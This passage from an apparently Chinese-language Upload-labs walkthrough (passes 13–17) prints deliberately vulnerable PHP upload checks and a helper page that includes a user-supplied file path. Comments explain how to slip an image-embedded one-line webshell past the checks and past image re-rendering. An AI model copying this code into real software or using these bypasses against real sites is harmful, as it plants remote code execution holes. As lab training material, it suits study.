intval() 不能用于 object，否则会产生 E_WARNING 错误并返回 1。 */</span><br><br>page2:<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(__file__);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//通过观察代码发现，此关会检查我们上传的文件的头两个字节，所以我们索性写一个图片马上传，又因为page2存在文件包含漏洞，所以我们上传图片马后复制图片马的url，在page2的页面写一个get传参&#x27;?file=upload/这里是文件名&#x27;即可。</span><br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass14-‘文件上传配合文件包含漏洞之getimagesize-检查’"><a href="#Upload-labs-pass14-‘文件上传配合文件包含漏洞之getimagesize-检查’" class="headerlink" title="Upload-labs-pass14: ‘文件上传配合文件包含漏洞之getimagesize()检查’"></a>Upload-labs-pass14: ‘文件上传配合文件包含漏洞之getimagesize()检查’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$filename</span>);<span class="hljs-comment">//获取图像信息</span><br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">image_type_to_extension</span>(<span class="hljs-variable">$info</span>[<span class="hljs-number">2</span>]);<span class="hljs-comment">//获取图像类型的常量值，根据常量值的不同判断图片文件类型</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$ext</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//getimagesize(string $filename, array &amp;$image_info = null): array|false</span><br><span class="hljs-comment">/*返回一个包含图像信息的数组，该数组的索引如下：</span><br><span class="hljs-comment">0：图像的宽度（单位：像素）</span><br><span class="hljs-comment">1：图像的高度（单位：像素）</span><br><span class="hljs-comment">2：图像类型的常量值（可以使用image_type_to_mime_type()函数将其转换为MIME类型）</span><br><span class="hljs-comment">3：包含图像属性的字符串，以逗号分隔（如：“width=500,height=300&quot;）</span><br><span class="hljs-comment">如果getimagesize（）函数无法读取图像信息，则返回false。否则，返回一个包含上述索引的数组。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//image_type_to_extension(int $image_type, bool $include_dot = true): string|false</span><br><span class="hljs-comment">/*取得图像类型的文件后缀 */</span><br><br>page2：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(__file__);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//观察代码可以发现这一关的基本思路与上一关差不多，按照上一关的思路操作即可。</span><br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass15-‘文件上传配合文件包含漏洞之exif-imagetype-检查’"><a href="#Upload-labs-pass15-‘文件上传配合文件包含漏洞之exif-imagetype-检查’" class="headerlink" title="Upload-labs-pass15: ‘文件上传配合文件包含漏洞之exif_imagetype()检查’"></a>Upload-labs-pass15: ‘文件上传配合文件包含漏洞之exif_imagetype()检查’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-comment">//需要开启php_exif模块</span><br>    <span class="hljs-variable">$image_type</span> = <span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$filename</span>);<span class="hljs-comment">//读取图像第一个字节，返回图像类型</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$image_type</span>) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;    <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//exif_imagetype(string $filename): int|false</span><br><span class="hljs-comment">/*exif_imagetype() 读取一个图像的第一个字节并检查其签名。返回一个图像类型的常量，对应不同的图片类型 */</span><br><br>page2:<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(__file__);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//观察代码可以发现这一关的基本思路与上一关差不多，按照上一关的思路操作即可。</span><br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass16-‘图片二次渲染’"><a href="#Upload-labs-pass16-‘图片二次渲染’" class="headerlink" title="Upload-labs-pass16: ‘图片二次渲染’"></a>Upload-labs-pass16: ‘图片二次渲染’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$tmpname</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    <span class="hljs-variable">$target_path</span>=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>);<br><br>    <span class="hljs-comment">// 获得上传文件的扩展名</span><br>    <span class="hljs-variable">$fileext</span>= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span><br>    <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是jpg格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$target_path</span>);<br>            <br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是png格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                 <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.png&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;               <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$target_path</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是gif格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.gif&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//imagecreatefromjpeg(string $filename): GdImage|false</span><br><span class="hljs-comment">/*imagecreatefromjpeg() 返回图像标识符，代表从指定文件名获得的图像。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//imagecreatefrompng(string $filename): GdImage|false</span><br><span class="hljs-comment">/*imagecreatefrompng() 返回图像标识符，代表从指定文件名获得的图像。*/</span><br><br><span class="hljs-comment">//imagecreatefromgif(string $filename): GdImage|false</span><br><span class="hljs-comment">/*imagecreatefromgif() 返回图像标识符，代表从指定文件名获得的图像。*/</span><br><br><span class="hljs-comment">//unlink(string $filename, ?resource $context = null): bool</span><br><span class="hljs-comment">/*删除 filename。*/</span><br><br><span class="hljs-comment">//srand(int $seed = 0, int $mode = MT_RAND_MT19937): void</span><br><span class="hljs-comment">/*使用 seed 播下随机数发生器种子，或者seed 是 0 时，使用随时值。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//time(): int</span><br><span class="hljs-comment">/*返回自从 Unix 纪元（格林威治时间 1970 年 1 月 1 日 00:00:00）到当前时间的秒数。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//imagegif(GdImage $image, resource|string|null $file = null): bool</span><br><span class="hljs-comment">/*imagegif() 从图像 image 在 file 中创建 GIF 图像。image 参数是 imagecreate() 或 imagecreatefrom* 函数的返回值。*/</span><br>page2:<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(__file__);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//观察源代码我们可以发现这是一个二次渲染绕过，二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符/图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败。按照前几关的方式上传，可以上传，但是包含漏洞无法解析。原因就是二次渲染将图片马里面的php代码删了。接下来把原图和修改后的图片进行比较，看哪里没有被渲染，在这里插入php代码。先上传图片马，再下载上传后的图片马，与原图片马一起放到010editor里面比较，找到没有被渲染的位置插入一句话木马，再次上传修改过后的图片马即可成功。</span><br><span class="hljs-comment">//tips:最好是使用gif图像，与原文件对比中找到第二个匹配的位置，在靠后一点的位置上粘贴一个一句话木马的代码，上传之后复制图片链接连接。</span><br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass17-‘竞争条件攻击1’"><a href="#Upload-labs-pass17-‘竞争条件攻击1’" class="headerlink" title="Upload-labs-pass17: ‘竞争条件攻击1’"></a>Upload-labs-pass17: ‘竞争条件攻击1’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span 